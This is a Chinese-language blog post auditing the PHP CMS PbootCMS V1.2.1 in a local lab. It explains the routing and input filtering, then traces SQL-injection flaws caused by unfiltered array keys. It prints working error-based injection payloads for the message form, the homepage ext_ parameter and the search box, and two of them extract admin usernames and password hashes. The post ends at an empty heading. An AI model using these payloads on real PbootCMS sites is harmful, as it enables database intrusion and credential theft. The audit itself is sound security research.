---
layout:  post    # 使用的布局（不需要改）
title:  代码审计之mvc架构pbootcms # 标题 
subtitle:   #副标题
date:  2021-02-19 # 时间
author:  yanmie    # 作者
header-img: img/.jpg ##标签这篇文章标题背景图片
catalog: true      # 是否归档
tags:        
    - 代码审计


---


**PbootCMS漏洞审计**

## 一、环境准备

下载地址：https://gitee.com/hnaoyun/PbootCMS/releases/V1.2.1

解析域名：http://www.pboot.cms/

这个系统很方便默认情况下，直接下载下来什么都不用做即可使用。（前提是开启 php sqlite 扩展）

我们将其改为 mysql 数据库使用。

mysql 新建数据库 `pbootcms` ，导入 `/PbootCMS/static/backup/sql`文件夹里的 sql 文件。

![image-20210219114620813](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210219114620813.png)

![image-20210219114645614](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210219114645614.png)

成功导入，然后修改数据库配置文件，`\config\database.php`

![image-20210219114752285](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210219114752285.png)

后台 `admin.php` 默认账户密码

​	账户：admin

​	密码：123456

## 二、熟悉MVC

目录结构：

```TXT
PbootCMS-V1.2.1
├─ apps         应用程序
│  ├─ admin     后台模块
│  ├─ api       api模块
│  ├─ common    公共模块
│  ├─ home      前台模块
├─ config       配置文件
│  ├─ config.php    配置文件
│  ├─ database.php  数据库配置文件
│  ├─ route.php     用户自定义路由规则
├─ core         框架核心
│  ├─ function  框架公共函数库
│  │  ├─ handle.php 助手函数库1
│  │  ├─ helper.php 助手函数库2
├─ template     html模板
├─ admin.php    管理端入口文件
├─ api.php      api入口文件
├─ index.php    前端入口文件
```

#### 2.1 自定义路由

路由文件： PbootCMS\apps\common\route.php

![image-20210219121510584](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210219121510584.png)

例如： http://www.pboot.cms/index.php/about/1

因为他的这个文件在系统的自定义路由上所以上面的路由解析以后就是

路由：

```php
'home/about' => 'home/about/index/scode',
```

对应文件：`PbootCMS/apps/home/controller/AboutController.php`

方法： `index`

参数： `scode`

那个 home 是由 对应的入口文件，例如文中的index.php中的URL_BLIND

![image-20210219121439798](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210219121439798.png)

我们自定义一个方法进行访问，

![image-20210219122035977](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210219122035977.png)

添加自定义路由：

![image-20210219122112807](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210219122112807.png)

成功访问：

![image-20210219122125039](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210219122125039.png)

#### 2.2 mvc动态路由

如果对于自定义路由没有的定义的路由，就会按照普通 mvc 模式来访问了。

比如：`http://www.pboot.cms/index.php/Message/add`

路劲文件： `PbootCMS/apps/home/controller/MessageController.php`

方法： `add`

我们在 自己在 `MessageController.php` 添加一个自定义方法来访问，

```php
    public function test2()
    {
        echo "MessageController --> test2 方法";
    }
```

访问：

`http://www.pboot.cms/index.php/Message/test2`

## 三、内核分析

#### 3.1 原生GET,POST,REQUEST

使用原生GET，POST，REQUEST变量是完全不过滤的

在`Message` 控制器中进行测试，

```php
    public function test2()
    {
        //echo "MessageController --> test2 方法";
        var_dump($_GET);
        echo "<br/>";
        var_dump($_POST);
        echo "<br/>";
        var_dump($_REQUEST);
    }
```



可以看到没有任何过滤，

![image-20210219124923984](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210219124923984.png)

所以使用原生变量获取方法就很有可能产生漏洞。

#### 3.2 系统获取变量函数

路径：`PbootCMS/core/function/helper.php`

方法：`get` , `post` , `request` 等

最后 `return filter($name, $condition);` 中一系列检测，再最后 `return escape_string($data);`  进行过滤：

```php
// 获取转义数据，支持字符串、数组、对象
function escape_string($string, $dropStr = true)
{
    if (! $string)
        return $string;
    if (is_array($string)) { // 数组处理
        foreach ($string as $key => $value) {
            $string[$key] = escape_string($value);
        }
    } elseif (is_object($string)) { // 对象处理
        foreach ($string as $key => $value) {
            $string->$key = escape_string($value);
        }
    } else { // 字符串处理
        if ($dropStr) {
            $string = preg_replace('/(0x7e)|(0x27)|(0x22)|(updatexml)|(extractvalue)|(name_const)|(concat)/i', '', $string);
        }
        $string = htmlspecialchars(trim($string), ENT_QUOTES, 'UTF-8');
        $string = addslashes($string);
    }
    return $string;
}
```

可以看得到所有传过来的内容都会先过一个正则匹配过滤

会将 0x7e，0x27，0x22，updatexml，extractvalue，name_const，concat 将其替换为''

再进行防止 xss和sql注入的再次过滤。

但是在这里只进行了数组 value的过滤 `$string[$key] = escape_string($value);` , key 并没有过滤。

`preg_replace` 可以双写绕过。

测试：

```php
    public function test2()
    {
        //echo "MessageController --> test2 方法";
        var_dump(get(a));
        echo "<br/>";
        var_dump(post(b));
        echo "<br/>";
        var_dump(request(c));
    }
```

效果如图

![image-20210219130239093](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210219130239093.png)

![image-20210219130248750](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210219130248750.png)

#### 3.3 数据库内核

测试查询数据，

新建一个数据表，

![image-20210219180907967](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210219180907967.png)

在  `MeaasgeController.php` 中，

```php
    public function test2()
    {
        //echo "MessageController --> test2 方法";
        $id = get("id");
        $result = $this->model->getUser($id);
        var_dump($result);
    }

```

在 `PbootCMS/apps/home/model/ParserModel.php` 中

```php
    // 查询测试用户
    public function getUser($id)
    {
        return parent::table("ay_testUser")->where("id=".$id)->select();
    }
```

访问 `http://www.pboot.cms/index.php/Message/test2?id=1` ,即可查询，

![image-20210219180839093](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210219180839093.png)

 

很明显，有sql注入：

![image-20210219201638212](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210219201638212.png)

测试插入数据，

`MessageController.php` :

```php
 	 public function test2()
    {
        // 增加用户
        $data["username"] = post("username");
        $data["password"] = post("password");
        if($data["username"]&&$data["password"])
            $result = $this->model->addUser($data);
        var_dump($result);
    }
```

在 `PbootCMS/apps/home/model/ParserModel.php` 中

```php
    // 插入用户数据
    public function addUser($data)
    {
        return parent::table("ay_testUser")->insert($data);
    }
```



![image-20210219202611225](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210219202611225.png)

成功插入。

测试更新数据

`MessageController.php` :

```php
   public function test2()
    {
        // 更新用户密码
        $data = [
            "username"=>post("username"),
            "password"=>post("password")
        ];
        $result = $this->model->updateUser($data);
        var_dump($result);

    }
```

在 `PbootCMS/apps/home/model/ParserModel.php` 中

```php
    // 更新用户数据
    public function updateUser($data)
    {
        return parent::table("ay_testUser")->where("username='".$data["username"]."'")->update(array("password"=>$data["password"]));
    }
```

测试成功。

![image-20210219210256395](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210219210256395.png)

测试删除数据

`MessageController.php` :

```php
    public function test2()
    {
        // 删除数据
        $id = get("id");
        $result = $this->model->deleteUser($id);
        var_dump($result);
    }
```

在 `PbootCMS/apps/home/model/ParserModel.php` 中

```php
    // 删除数据
    public function deleteUser($id)
    {
        return parent::table("ay_testUser")->where("id='$id'")->delete();
    }
```

![image-20210219210727691](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210219210727691.png)

测试删除成功。

#### 3.4 调试数据库内核

where 方法得到拼接 where 条件，无过滤

![image-20210219223134680](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210219223134680.png)

select 方法最终得到

![image-20210219223254138](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210219223254138.png)

整个db 类的底层都是类似的字符串拼接

## 四、留言处 insert sql注入

由于此 cms 只会对数组键值进行过滤而不会对键进行过滤，恰巧这里浏览处可以接收数组。

poc:

```php
# POST
contacts[content`,`create_time`,`update_time`) VALUES ('1', '1' ,1 and updatexml(1,concat(0x3a,user()),1) );-- a] = 111&mobile=111&content=111&checkcode=111
```

我们使用浏览器+phpstorm调试来探明注入漏洞的产生。（为方便测试，已修改源代码将验证码功能注释）

首先读取了数据库留言表字段，返回一个三维数组，数组 `table_name `为数据表名，`name` 分别即为 `contacts` ，`mobile`, `content`  ,这里用处即为作为 post接收数据的 键

![image-20210221132258112](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210221132258112.png)

这里即起到了作用，遍历二维数组的分别 `name` 值接收 post 数据。

```php
$field_data = post($value->name);
```



![image-20210221132745418](C:%5CUsers%5C51946%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210221132745418.png)

将数据存储到 data 数组中，由于接受的 contacts 为数组，所以 data 也就变成了多维数组。

![image-20210221133106804](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210221133106804.png)

接下来，我们对 `addMessage` 操作进行调试探索，按 F7

```php
if ($this->model->addMessage($data))
```

到了：

```php
    // 新增留言
    public function addMessage($data)
    {
        return parent::table('ay_message')->autoTime()->insert($data);
    }
```

继续 F7 ,这里主要是 `insert` 函数比较关键。

```php
    /**
     * 数据插入模型
     *
     * @param array $data
     *            可以为一维或二维数组，
     *            一维数组：array('username'=>"xsh",'sex'=>'男'),
     *            二维数组：array(
     *            array('username'=>"xsh",'sex'=>'男'),
     *            array('username'=>"gmx",'sex'=>'女')
     *            )
     * @param boolean $batch
     *            是否启用批量一次插入功能，默认true
     * @return boolean|boolean|array
     */
final public function insert(array $data = array(), $batch = true)
    {
        // 未传递数据时，使用data函数插入数据
        if (! $data && isset($this->sql['data'])) {
            return $this->insert($this->sql['data']);
        }
        if (is_array($data)) {
            
            if (! $data)
                return;
            if (count($data) == count($data, 1)) { // 单条数据
                $keys = '';
                $values = '';
                foreach ($data as $key => $value) {
                    if (! is_numeric($key)) {
                        $keys .= "`" . $key . "`,";
                        $values .= "'" . $value . "',";
                    }
                }
                if ($this->autoTimestamp || (isset($this->sql['auto_time']) && $this->sql['auto_time'] == true)) {
                    $keys .= "`" . $this->createTimeField . "`,`" . $this->updateTimeField . "`,";
                    if ($this->intTimeFormat) {
                        $values .= "'" . time() . "','" . time() . "',";
                    } else {
                        $values .= "'" . date('Y-m-d H:i:s') . "','" . date('Y-m-d H:i:s') . "',";
                    }
                }
                if ($keys) { // 如果插入数据关联字段,则字段以关联数据为准,否则以设置字段为准
                    $this->sql['field'] = '(' . substr($keys, 0, - 1) . ')';
                } elseif (isset($this->sql['field']) && $this->sql['field']) {
                    $this->sql['field'] = "({$this->sql['field']})";
                }
                $this->sql['value'] = "(" . substr($values, 0, - 1) . ")";
                $sql = $this->buildSql($this->insertSql);
            } else { // 多条数据
                if ($batch) { // 批量一次性插入
                    $key_string = '';
                    $value_string = '';
                    $flag = false;
                    foreach ($data as $keys => $value) {
                        if (! $flag) {
                            $value_string .= ' SELECT ';
                        } else {
                            $value_string .= ' UNION All SELECT ';
                        }
                        foreach ($value as $key2 => $value2) {
                            // 字段获取只执行一次
                            if (! $flag && ! is_numeric($key2)) {
                                $key_string .= "`" . $key2 . "`,";
                            }
                            $value_string .= "'" . $value2 . "',";
                        }
                        $flag = true;
                        if ($this->autoTimestamp || (isset($this->sql['auto_time']) && $this->sql['auto_time'] == true)) {
                            if ($this->intTimeFormat) {
                                $value_string .= "'" . time() . "','" . time() . "',";
                            } else {
                                $value_string .= "'" . date('Y-m-d H:i:s') . "','" . date('Y-m-d H:i:s') . "',";
                            }
                        }
                        $value_string = substr($value_string, 0, - 1);
                    }
                    if ($this->autoTimestamp || (isset($this->sql['auto_time']) && $this->sql['auto_time'] == true)) {
                        $key_string .= "`" . $this->createTimeField . "`,`" . $this->updateTimeField . "`,";
                    }
                    if ($key_string) { // 如果插入数据关联字段,则字段以关联数据为准,否则以设置字段为准
                        $this->sql['field'] = '(' . substr($key_string, 0, - 1) . ')';
                    } elseif (isset($this->sql['field']) && $this->sql['field']) {
                        $this->sql['field'] = "({$this->sql['field']})";
                    }
                    $this->sql['value'] = $value_string;
                    $sql = $this->buildSql($this->insertMultSql);
                    // 判断SQL语句是否超过数据库设置
                    if (get_db_type() == 'mysql') {
                        $max_allowed_packet = $this->getDb()->one('SELECT @@global.max_allowed_packet', 2);
                    } else {
                        $max_allowed_packet = 1 * 1024 * 1024; // 其他类型数据库按照1M限制
                    }
                    if (strlen($sql) > $max_allowed_packet) { // 如果要插入的数据过大，则转换为一条条插入
                        return $this->insert($data, false);
                    }
                } else { // 批量一条条插入
                    foreach ($data as $keys => $value) {
                        $result = $this->insert($value);
                    }
                    return $result;
                }
            }
        } elseif ($this->sql['from']) {
            if (isset($this->sql['field']) && $this->sql['field']) { // 表指定字段复制
                $this->sql['field'] = "({$this->sql['field']})";
            }
            $sql = $this->buildSql($this->insertFromSql);
        } else {
            return;
        }
        return $this->getDb()->amd($sql);
    }
```

判断 data 为空即返回

![image-20210221133417704](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210221133417704.png)

这里 `count` 用于判断是否 data 为多维数组,如果不是即相等，否则不相等。

```php
if (count($data) == count($data, 1))
```

所以，转到 else ,`$key_string` 和 `$value_string` 用于拼接。

由于 `data['contacts']` 为数组，所以再次进行 foreach ,进行分别拼接键和键值。

![image-20210221133803270](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210221133803270.png)

其余操作一直为 拼接 `$value_string` ,接下来跳出了 foreach,

然后拼接`$key_string` ，之后出现 `sql` 数组，进入 `buildSql` 函数，构建 Sql 语句，获得

```sql
$sql = "INSERT INTO ay_message (`content`,`create_time`,`update_time`) VALUES ('1', '1' ,1 and updatexml(1,concat(0x3a,user()),1) );-- a`,`create_time`,`update_time`)  SELECT '111','2021-02-21 13:38:58','2021-02-21 13:38:58' UNION All SELECT '2021-02-21 13:39:46','2021-02-21 13:39:46' UNION All SELECT '2021-02-21 13:39:51','2021-02-21 13:39:51' UNION All SELECT '2021-02-21 13:39:53','2021-02-21 13:39:53' UNION All SELECT '2021-02-21 13:40:03','2021-02-21 13:40:03' UNION All SELECT '2021-02-21 13:40:04','2021-02-21 13:40:04' UNION All SELECT '2021-02-21 13:40:13','2021-02-21 13:40:13' UNION All SELECT '2021-02-21 13:40:17','2021-02-21 13:40:17' UNION All SELECT '2021-02-21 13:40:20','2021-02-21 13:40:20' UNION All SELECT '2021-02-21 13:40:22','2021-02-21 13:40:22' UNION All SELECT '2021-02-21 13:40:25','2021-02-21 13:40:25'"
```



![image-20210221134308400](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210221134308400.png)

即发生了注入,拼接了恶意sql语句

```sql
INSERT INTO ay_message (`content`,`create_time`,`update_time`) VALUES ('1', '1' ,1 and updatexml(1,concat(0x3a,user()),1) );-- a`,`create_time`,`update_time`)
```

![image-20210221134618323](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210221134618323.png)

## 五、前台首页sql注入

poc:

```php
http://www.pboot.cms/index.php/Index?ext_price%3D1/**/and/**/updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,username,0x3a,password,0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1));%23=12
```



`PbootCMS/apps/home/controller/IndexController.php` , index 方法：

```php
    // parserAfter -> parserSpecifyListLabel
    public function index()
    {
        $content = parent::parser('index.html'); // 框架标签解析
        $content = $this->parser->parserBefore($content); // CMS公共标签前置解析
        $content = $this->parser->parserPositionLabel($content, - 1, '首页', SITE_DIR . '/'); // CMS当前位置标签解析
        $content = $this->parser->parserSpecialPageSortLabel($content, 0, '', SITE_DIR . '/'); // 解析分类标签
        $content = $this->parser->parserAfter($content); // CMS公共标签后置解析
        $this->cache($content, true);
    }
```

跟进 

```php
$content = $this->parser->parserAfter($content); 这个方法
```



`PbootCMS/apps/home/controller/ParserController.php`  ,`parserAfter()`

```php
// 解析全局后置公共标签
    public function parserAfter($content)
    {
    	...
        $content = $this->parserSpecifyListLabel($content); // 指定列表
        return $content;
    }
```

```php
// 解析指定分类列表标签
public function parserSpecifyListLabel($content)
{
  ...
  // 数据筛选 骚操作注入
  $where2 = array();
  foreach ($_GET as $key => $value) {
    if (substr($key, 0, 4) == 'ext_') { // 其他字段不加入
      $where2[$key] = get($key);
    }
  }
  ...
  // 读取数据
  if ($page) {
  	$data = $this->model->getList($scode, $num, $order, $where1, $where2);
  } else {
  	$data = $this->model->getSpecifyList($scode, $num, $order, $where1, $where2);
  }
}
```

这里读取数据 `$this->model->getSpecifyList`

这里接收了外部了外部所有的get参数然后判断了开头的前4个字符是否 ext_ 开头，如果符合就直接拼接进入$where2这个数组 然后带入数据库进行getList方法与getSpecifyList查询，而底层是字符串拼接，过滤了value没有过滤key所以有注入

最终 sql 语句

```sql
SELECT  a.*,b.name as sortname,b.filename as sortfilename,c.name as subsortname,c.filename as subfilename,d.type,e.* FROM ay_content a  LEFT JOIN ay_content_sort b ON a.scode=b.scode LEFT JOIN ay_content_sort c ON a.subscode=c.scode LEFT JOIN ay_model d ON b.mcode=d.mcode LEFT JOIN ay_content_ext e ON a.id=e.contentid WHERE(a.scode in ('5','6','7') OR a.subscode='5') AND(a.acode='cn' AND a.status=1 AND d.type=2) AND(ext_price=1/**/and/**/updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,username,0x3a,password,0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1));# like '%12%' )   ORDER BY date DESC,sorting ASC,id DESC LIMIT 4 
```

## 六、搜索框sql注入

poc：

```php
http://www.pboot.cms/index.php/Search/index?keyword=aaaa&updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,username,0x3a,password,0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1));%23=123
```

`PbootCMS/apps/home/controller/SearchController.php` 中 index 方法

```php
    public function index()
    {
        $content = parent::parser('search.html'); // 框架标签解析
        $content = $this->parser->parserBefore($content); // CMS公共标签前置解析
        $content = $this->parser->parserPositionLabel($content, 0, '搜索', url('/home/Search/index')); // CMS当前位置标签解析
        $content = $this->parser->parserSpecialPageSortLabel($content, 0, '搜索结果', url('/home/Search/index')); // 解析分类标签
        $content = $this->parser->parserSearchLabel($content); // 搜索结果标签
        $content = $this->parser->parserAfter($content); // CMS公共标签后置解析
        $this->cache($content, true);
    }
```

跟进

```php
$this->parser->parserSearchLabel
```

`PbootCMS/apps/home/controller/ParserController.php` 中 parserSearchLabel 方法，

这里将 恶意语句带入，

![image-20210221152402336](https://gitee.com/luo_fan_1/yanmie-art/raw/master/img/image-20210221152402336.png)

接下来就是读取数据这里

```php
 // 读取数据
if (! $data = $this->model->getList($scode, $num, $order, $where1, $where2, $fuzzy)) {
          $content = str_replace($matches[0][$i], '', $content);
          continue;
}
```

这里接收了外部了外部所有的get参数然后就直接拼接进入$where2这个数组 然后带入数据库进行getList方法查询，而底层是字符串拼接，过滤了value没有过滤key所以有注入.

## 七、API 模板注入

